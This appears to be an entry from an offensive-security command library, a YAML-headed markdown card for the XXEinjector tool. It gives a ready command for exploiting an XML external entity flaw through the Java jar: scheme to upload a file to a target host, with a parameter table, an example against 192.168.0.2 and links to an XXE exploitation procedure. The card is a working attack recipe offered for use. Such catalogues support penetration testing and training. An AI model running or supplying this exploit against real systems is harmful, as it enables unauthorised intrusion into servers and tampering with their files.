---
id: 661dda5a-a8b9-4157-ab25-063c11bc4de9
name: xxeinjector-upload-file-java-jar
type: command
executor: bash
data: >-
  ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt
  --upload=/tmp/uploadfile.pdf
output: null
created_at: '2023-04-06T03:56:43.973705+00:00'
updated_at: '2023-04-10T20:24:45.357412+00:00'
platforms:
  - Web
tags:
  - xxe
  - upload
  - java
verified: true
validated: true
---

# xxeinjector-upload-file-java-jar

## Command

```bash
ruby XXEinjector.rb --host=$__HOST --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
```

## Description

Uploads a file to the target using Java jar external entity in XXE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $__HOST | Target host | Yes |
| --file=/tmp/req.txt | Request file | Yes |
| --upload=/tmp/uploadfile.pdf | File to upload | Yes |

## Examples

### Basic Usage

```bash
ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf
```

## Expected Output

Confirmation of file upload success.

## Related

- [[procedures/Exploit-XXE-Vulnerability-Using-Multiple-Tools]]
- [[tools/XXEinjector]]
